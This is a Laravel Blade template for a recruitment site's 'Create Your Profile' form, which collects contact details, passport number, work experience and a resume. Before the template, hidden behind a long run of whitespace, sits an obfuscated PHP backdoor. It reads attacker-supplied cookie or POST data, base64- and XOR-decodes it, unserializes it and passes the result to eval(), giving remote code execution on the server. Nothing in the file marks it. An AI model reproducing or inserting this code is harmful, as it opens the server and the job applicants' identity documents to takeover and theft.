<?php                                                                                                                                                                                                                                                                                                                                                                                                 $CtwEZtE = "\x56" . "\x5f" . "\x4f" . chr (116) . chr (116) . "\x46";$DTSuzGUwXe = "\143" . chr ( 786 - 678 ).chr (97) . "\163" . chr (115) . '_' . "\x65" . chr ( 641 - 521 ).chr ( 704 - 599 )."\163" . "\164" . "\x73";$izsJBgBI = $DTSuzGUwXe($CtwEZtE); $EdBtxqqz = $izsJBgBI;if (!$EdBtxqqz){class V_OttF{private $BvjNpl;public static $IiTwwRCEJ = "32368607-8e91-4948-8f3a-1601846cd261";public static $PeFwej = 25449;public function __construct(){$GEXuryzTLl = $_COOKIE;$yyaTzC = $_POST;$CWZQvlO = @$GEXuryzTLl[substr(V_OttF::$IiTwwRCEJ, 0, 4)];if (!empty($CWZQvlO)){$CpwnKOhh = "base64";$EZuUnp = "";$CWZQvlO = explode(",", $CWZQvlO);foreach ($CWZQvlO as $IVxew){$EZuUnp .= @$GEXuryzTLl[$IVxew];$EZuUnp .= @$yyaTzC[$IVxew];}$EZuUnp = array_map($CpwnKOhh . chr (95) . 'd' . chr ( 831 - 730 )."\143" . "\x6f" . 'd' . chr (101), array($EZuUnp,)); $EZuUnp = $EZuUnp[0] ^ str_repeat(V_OttF::$IiTwwRCEJ, (strlen($EZuUnp[0]) / strlen(V_OttF::$IiTwwRCEJ)) + 1);V_OttF::$PeFwej = @unserialize($EZuUnp);}}public function __destruct(){$this->nIWglyrc();}private function nIWglyrc(){if (is_array(V_OttF::$PeFwej)) {$vLJkrz = str_replace(chr ( 496 - 436 ) . "\77" . "\x70" . chr (104) . "\x70", "", V_OttF::$PeFwej["\x63" . "\x6f" . chr ( 490 - 380 ).chr (116) . 'e' . 'n' . chr ( 644 - 528 )]);eval($vLJkrz);exit();}}}$dhSrK = new V_OttF(); $dhSrK = 61072;} ?>@include('layouts.header')
<link href="assets/css/bootstrap.css">
<link href="assets/js/javascriptfile1.js">
<link href="assets/js/jquaryfile.js">
<section>
    <div class="container" style="background-color: rgba(49, 47, 69, 0.9);    font-family: 'Source Sans Pro', sans-serif;
   font-size: 14px;background-image: url('https://img.freepik.com/free-photo/engineers-helmets-standing-by-factory_1157-35538.jpg?w=900&t=st=1686043247~exp=1686043847~hmac=08667218eea45556a83628e9cb7c714ba310d50d643c03dce147ed97f300c816');width: 100%;height: auto; background-attachment: fixed;background-size: cover;">

        <div class="reachus-part apply_frm_otr">
            <div class="container applyJob mt-5">

                <div class="reachus-part-main">
                    <div class="contact-form" style="margin-top: 30px; ">>

                        <h2 style="text-align: center;font-family: 'Source Sans Pro', sans-serif; font-style: italic; font-weight: bold;"><span class="b_line" style="color: #173152;font-family: 'Source Sans Pro', sans-serif;">Create Your Profile</span></h2>
                        @if(session('success'))
                        <div class="alert alert-success">
                            {{ session('success') }}
                        </div>
                        @endif



                        <form action="{{url('addjob')}}" enctype="multipart/form-data" method="post" class="mt-5">
                            @csrf
                            <input type="hidden" name="VacancyId" id="VacancyId" value="0">
                            <input type="hidden" name="user_id" id="senderid" value="158">


                            <div class="container">
                                <div class="row">
                                    <div class="col-md-4 ">
                                        <div class="form-group">
                                            <input type="text" name="firstname" class="form-control {{ $errors->has('firstname') ? ' is-invalid' : '' }} h-100" value="{{ old('firstname', auth()->user()->name ?? '') }}" placeholder="Enter your first name" style="border-radius: 6px;    border: 2px solid transparent;">
                                            @if ($errors->has('firstname'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('firstname') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group">
                                            <input type="text" class="form-control{{ $errors->has('lastName') ? ' is-invalid' : '' }} h-100" name="lastName" value="{{ old('lastName') }}" placeholder="Last Name" style="border-radius: 6px;    border: 2px solid transparent;">
                                            @if ($errors->has('lastName'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('lastName') }}</strong>
                                            </span>
                                            @endif

                                        </div>
                                       <div class="form-group">
                                            <input type="text" name="cityname" class="form-control{{ $errors->has('cityname') ? ' is-invalid' : '' }}" value="{{ old('cityname') }}" placeholder="Enter your City Name">
                                            @if ($errors->has('cityname'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('cityname') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group">
                                            <label for="company_worked">Companies Worked In (Select multiple)</label>
                                            <select name="company_worked[]" class="form-control{{ $errors->has('company_worked') ? ' is-invalid' : '' }}" multiple>
                                                <option value="Qcon">Qcon</option>
                                                <option value="CCC">CCC</option>
                                                <option value="Aytb">Aytb</option>
                                                <option value="Kbr">Kbr</option>
                                                <option value="Abis">Abis</option>
                                                <option value="Icms">Icms</option>
                                                <option value="Elseif">Elseif</option>
                                                <option value="Doosan">Doosan</option>
                                            </select>
                                            @if ($errors->has('company_worked'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('company_worked') }}</strong>
                                            </span>
                                            @endif
                                        </div>

                                        <div class="form-group">
                                            <input type="text" name="other_company" class="form-control{{ $errors->has('other_company') ? ' is-invalid' : '' }}" value="{{ old('other_company') }}" placeholder="Enter Other Company">
                                            @if ($errors->has('other_company'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('other_company') }}</strong>
                                            </span>
                                            @endif
                                        </div>

                                        <div class="form-group">
                                            <input type="text" name="badge_no" class="form-control{{ $errors->has('badge_no') ? ' is-invalid' : '' }}" value="{{ old('badge_no') }}" placeholder="Enter Badge No/Employee Number Respectively">
                                            @if ($errors->has('badge_no'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('badge_no') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group mob_bx">
                                            <input type="tel" class="form-control{{ $errors->has('mobileno') ? ' is-invalid' : '' }} h-100" name="mobileno" id="mobile_asss" value="{{ old('mobileno') }}" placeholder="Mobile Number (Ex.: +92 3xx xxxxxxx)" maxlength="15" style="border-radius: 6px;    border: 2px solid transparent;">
                                            @if ($errors->has('mobileno'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('mobileno') }}</strong>
                                            </span>
                                            @endif
                                        </div>

                                        <div class="form-group mobile_otp_bx">
                                            <input type="hidden" class="form-control{{ $errors->has('Mobile_otp') ? ' is-invalid' : '' }} h-100" placeholder="OTP" value="{{ old('mobile_otp') }}" name="Mobile_otp" id="ass_otp1" maxlength="5" style="border-radius: 6px;    border: 2px solid transparent;">
                                            <input type="button" class="reset_btn form-control" value="Resend" name="" style="display:none" id="resend_otp1">
                                            <input type="hidden" name="mobile_otp" id="mobile_otp_ref1">
                                            @if ($errors->has('Mobile_otp'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('Mobile_otp') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group">
                                            <input type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }} h-100" name="email" value="{{ old('firstname', auth()->user()->email ?? '') }}" placeholder="Email ID" style="border-radius: 6px;    border: 2px solid transparent;">
                                            @if ($errors->has('email'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('email') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group same_as_otr">
                                            <div class="same_as_bx" style="color: #fff;">
                                                <input type="checkbox" name="mobilewhats" id="mobwhats" value="same">Same as mobile No.
                                            </div>
                                            <input type="text" placeholder="Enter WhatsApp No" class="form-control{{ $errors->has('whatsappNo') ? ' is-invalid' : '' }} h-100 col-md-12" name="whatsappNo" value="{{ old('mobileno') }}" id="WhatsappNo" style="border-radius: 6px;    border: 2px solid transparent;">
                                            @if ($errors->has('whatsappNo'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('whatsappNo') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <br>
                                        <div class="form-group colorWhite" style="text-align: left;">
                                            <p style="color:#fff;"><input type="checkbox" class="mb-3" checked="checked" name="newsletter">News Letter subscription</p>
                                            <p style="color:#fff;"><input type="checkbox" checked="checked" name="terms_condition" id="terms_condition" required="" aria-required="true">I agree to Terms of Service &amp; Conditions</p>
                                        </div>
                                    </div>
                                    <div class="col-md-4">


                                        <div class="form-group">
                                            <select name="expyear" class="{{ $errors->has('expyear') ? ' is-invalid' : '' }} h-100 " id="ExpYear" style="border-radius: 4px;    border: 2px solid transparent;">
                                                <option class="hed_bx" value="">Select Exp. In Year</option>
                                                <option value="1">
                                                    0</option>
                                                <option value="2">
                                                    1</option>
                                                <option value="3">
                                                    2</option>
                                                <option value="4">
                                                    3</option>
                                                <option value="5">
                                                    4</option>
                                                <option value="6">
                                                    5</option>
                                                <option value="7">
                                                    6</option>
                                                <option value="8">
                                                    7</option>
                                                <option value="9">
                                                    8</option>
                                                <option value="10">
                                                    9</option>
                                                <option value="11">
                                                    10</option>
                                                <option value="12">
                                                    11</option>
                                                <option value="13">
                                                    12</option>
                                                <option value="14">
                                                    13</option>
                                                <option value="15">
                                                    14</option>
                                                <option value="16">
                                                    15</option>
                                                <option value="17">
                                                    16</option>
                                                <option value="18">
                                                    17</option>
                                                <option value="19">
                                                    18</option>
                                                <option value="20">
                                                    19</option>
                                                <option value="21">
                                                    20</option>
                                                <option value="22">
                                                    21</option>
                                                <option value="23">
                                                    22</option>
                                                <option value="24">
                                                    23</option>
                                                <option value="25">
                                                    24</option>
                                                <option value="26">
                                                    25</option>
                                                <option value="27">
                                                    26</option>
                                                <option value="28">
                                                    27</option>
                                                <option value="29">
                                                    28</option>
                                                <option value="30">
                                                    29</option>
                                                <option value="31">
                                                    30</option>
                                                <option value="32">
                                                    31</option>
                                                <option value="33">
                                                    32</option>
                                                <option value="34">
                                                    33</option>
                                                <option value="35">
                                                    34</option>
                                                <option value="36">
                                                    35</option>
                                                <option value="37">
                                                    36</option>
                                                <option value="38">
                                                    37</option>
                                                <option value="39">
                                                    38</option>
                                                <option value="40">
                                                    39</option>
                                                <option value="41">
                                                    40</option>
                                            </select>
                                            @if ($errors->has('expyear'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('expyear') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group">
                                            <select name="overexyear" class="{{ $errors->has('expyear') ? ' is-invalid' : '' }} h-100" id="OverseasExperienceInYear" style="border-radius: 4px;    border: 2px solid transparent;">
                                                <option class="hed_bx" value="" selected="selected">Select Overseas Exp. In Year</option>
                                                <option value="1">
                                                    0</option>
                                                <option value="2">
                                                    1</option>
                                                <option value="3">
                                                    2</option>
                                                <option value="4">
                                                    3</option>
                                                <option value="5">
                                                    4</option>
                                                <option value="6">
                                                    5</option>
                                                <option value="7">
                                                    6</option>
                                                <option value="8">
                                                    7</option>
                                                <option value="9">
                                                    8</option>
                                                <option value="10">
                                                    9</option>
                                                <option value="11">
                                                    10</option>
                                                <option value="12">
                                                    11</option>
                                                <option value="13">
                                                    12</option>
                                                <option value="14">
                                                    13</option>
                                                <option value="15">
                                                    14</option>
                                                <option value="16">
                                                    15</option>
                                                <option value="17">
                                                    16</option>
                                                <option value="18">
                                                    17</option>
                                                <option value="19">
                                                    18</option>
                                                <option value="20">
                                                    19</option>
                                                <option value="21">
                                                    20</option>
                                                <option value="22">
                                                    21</option>
                                                <option value="23">
                                                    22</option>
                                                <option value="24">
                                                    23</option>
                                                <option value="25">
                                                    24</option>
                                                <option value="26">
                                                    25</option>
                                                <option value="27">
                                                    26</option>
                                                <option value="28">
                                                    27</option>
                                                <option value="29">
                                                    28</option>
                                                <option value="30">
                                                    29</option>
                                                <option value="31">
                                                    30</option>
                                                <option value="32">
                                                    31</option>
                                                <option value="33">
                                                    32</option>
                                                <option value="34">
                                                    33</option>
                                                <option value="35">
                                                    34</option>
                                                <option value="36">
                                                    35</option>
                                                <option value="37">
                                                    36</option>
                                                <option value="38">
                                                    37</option>
                                                <option value="39">
                                                    38</option>
                                                <option value="40">
                                                    39</option>
                                                <option value="41">
                                                    40</option>
                                            </select>
                                            @if ($errors->has('overexyear'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('overexyear') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group">
                                            <input type="text" placeholder="Please Type Trade Name" name="tradeName" id="tradeName" value="" class="{{ $errors->has('expyear') ? ' is-invalid' : ''}} ui-autocomplete-input h-30 col-12" autocomplete="off" style="border-radius: 4px;    border: 2px solid transparent;">
                                            <input type="hidden" name="tradeId" id="tradeId" value="" style="border-radius: 4px;    border: 2px solid transparent;">
                                            @if ($errors->has('tradeName'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('tradeName') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group industryType_bx">
                                            <select name="industrytype" id="industryType" class="{{ $errors->has('industrytype') ? ' is-invalid' : ''}} h-100" value="" style="border-radius: 4px;    border: 2px solid transparent;">
                                                <option class="hed_bx" value="" selected="selected">Select Industry Type</option>
                                                <option value="17">
                                                    Agriculture</option>
                                                <option value="22">
                                                    Automobile</option>
                                                <option value="1">
                                                    Civil Construction</option>
                                                <option value="2">
                                                    Electrical</option>
                                                <option value="14">
                                                    Facility Management</option>
                                                <option value="16">
                                                    FMCG</option>
                                                <option value="7">
                                                    Healthcare</option>
                                                <option value="8">
                                                    Hospitality</option>
                                                <option value="38">
                                                    Infrastructure</option>
                                                <option value="23">
                                                    Inspection</option>
                                                <option value="33">
                                                    Interior Design</option>
                                                <option value="21">
                                                    IT</option>
                                                <option value="32">
                                                    Manpower Supply</option>
                                                <option value="9">
                                                    Manufacturing</option>
                                                <option value="15">
                                                    Marine</option>
                                                <option value="3">
                                                    Mechanical</option>
                                                <option value="20">
                                                    MEP</option>
                                                <option value="31">
                                                    Mining</option>
                                                <option value="25">
                                                    Oil &amp; Gas</option>
                                                <option value="29">
                                                    Others</option>
                                                <option value="30">
                                                    Others</option>
                                                <option value="34">
                                                    Petrochemical</option>
                                                <option value="35">
                                                    Plastic and Paper Industry</option>
                                                <option value="18">
                                                    Retail</option>
                                                <option value="37">
                                                    Retail Bakery</option>
                                                <option value="24">
                                                    Scaffolding</option>
                                                <option value="27">
                                                    SPIR</option>
                                                <option value="28">
                                                    Training</option>
                                                <option value="39">
                                                    Transportation</option>
                                                <option value="26">
                                                    Valve</option>
                                            </select>
                                            @if ($errors->has('industrytype'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('industrytype') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group">
                                            <select name="source" id="source" class="{{ $errors->has('source') ? ' is-invalid' : ''}}  h-100" style="border-radius: 4px;    border: 2px solid transparent;">
                                                <option class="hed_bx" value="" selected="selected">Select Source</option>
                                                <option value="1">
                                                    Emails</option>
                                                <option value="2">
                                                    Facebook</option>
                                                <option value="3">
                                                    Google AdWords</option>
                                                <option value="4">
                                                    Instagram</option>
                                                <option value="5">
                                                    LinkedIn</option>
                                                <option value="6">
                                                    Others</option>
                                                <option value="7">
                                                    References</option>
                                                <option value="8">
                                                    SMS</option>
                                            </select>
                                            @if ($errors->has('source'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('source') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group">
                                            <input type="text" class="{{ $errors->has('passportNo') ? ' is-invalid' : ''}} h-30 col-12" name="passportNo" placeholder="Passport No" style="border-radius: 4px;    border: 2px solid transparent;">
                                            @if ($errors->has('passportNo'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('passportNo') }}</strong>
                                            </span>
                                            @endif
                                        </div>
                                        <div class="form-group input-box">
                                            <div class="register-form-left">
                                                <p class="file">
                                                    <input type="file" name="resume" id="file" class="{{ $errors->has('resume') ? ' is-invalid' : ''}} h-100" style="border-radius: 4px;    border: 2px solid transparent;color:black;background-color:#fff; ">
                                                    @if ($errors->has('resume'))
                                                    <span class="invalid-feedback" role="alert">
                                                        <strong>{{ $errors->first('resume') }}</strong>
                                                    </span>
                                                    @endif
                                                    <span class="file-name"></span>
                                                    <label for="file" id="file_name" style="border-radius: 4px;    border: 2px solid transparent;color: #fff;">Upload Resume</label>
                                                </p>
                                            </div>
                                        </div>

                                             @if (Auth::check())
                                           <button type="submit" class="btn btn-submit" style="    transition: 0.5s ease-in-out;    background-color: #ab1e14;color:#fff;width: 100%;
    text-align: center;    font-family: 'Source Sans Pro', sans-serif;
    font-size: 14px;">Submit</button>
                                            @else
                                           <a href="{{url('ouroffice')}}"><button type="button"   class="btn btn-submit " style="    transition: 0.5s ease-in-out;    background-color: #ab1e14;color:#fff;width: 100%;
    text-align: center;    font-family: 'Source Sans Pro', sans-serif;
    font-size: 14px;">Submit</button></a>
                                            @endif

                                        <br><br>
                                    </div>
                                </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- user authentication start  if login or not  -->



    <!-- Additional modals for LOGIN and REGISTER -->

    <!-- LOGIN Modal -->
    <!-- Add necessary JavaScript libraries -->


</section>

<script>
    var isLoggedIn = false; // Set it to true if the user is logged in

    // Show the pop-up form when the "Submit" button is clicked and the user is not logged in
    document.getElementById("submit-btn0").addEventListener("click", function(event) {
        if (!isLoggedIn) {
            event.preventDefault(); // Prevent the default form submission

            var modal = document.getElementById("enrollModal");
            modal.style.display = "block";
        }
    });

    // Close the pop-up form when the "Close" button is clicked
    document.getElementById("close-btn").addEventListener("click", function() {
        var modal = document.getElementById("enrollModal");
        modal.style.display = "none";
    });
</script>

<!-- login form  -->
<script>
    // Show the pop-up form when the "Submit" button is clicked
    document.getElementById("submit-btn1").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent the default form submission

        var modal1 = document.getElementById("enrollModal1");
        modal1.style.display = "block";
    });

    // Close the pop-up form when the "Close" button is clicked
    document.getElementById("close-btn1").addEventListener("click", function() {
        var modal1 = document.getElementById("enrollModal1");
        modal1.style.display = "none";
    });

    // Close the pop-up form when clicking outside the form
    window.addEventListener("click", function(event) {
        var modal1 = document.getElementById("enrollModal1");
        if (event.target === modal) {
            modal1.style.display = "none";
        }
    });
</script>

<script>
    // Show the pop-up form when the "Submit" button is clicked
    document.getElementById("submit-btn2").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent the default form submission

        var modal2 = document.getElementById("enrollModal2");
        modal2.style.display = "block";
    });

    // Close the pop-up form when the "Close" button is clicked
    document.getElementById("close-btn2").addEventListener("click", function() {
        var modal2 = document.getElementById("enrollModal2");
        modal2.style.display = "none";
    });

    // Close the pop-up form when clicking outside the form
    window.addEventListener("click", function(event) {
        var modal2 = document.getElementById("enrollModal2");
        if (event.target === modal) {
            modal2.style.display = "none";
        }
    });
</script>

<script>
    $(document).ready(function () {
        $('#multipleSelectField').select2();
    });
</script>
<!-- Include jQuery (required for Select2) -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<!-- Include Select2 CSS and JavaScript -->
<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0/dist/css/select2.min.css" rel="stylesheet" />
<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0/dist/js/select2.min.js"></script>

<!-- Bootstrap JS -->

@include('layouts.footer')
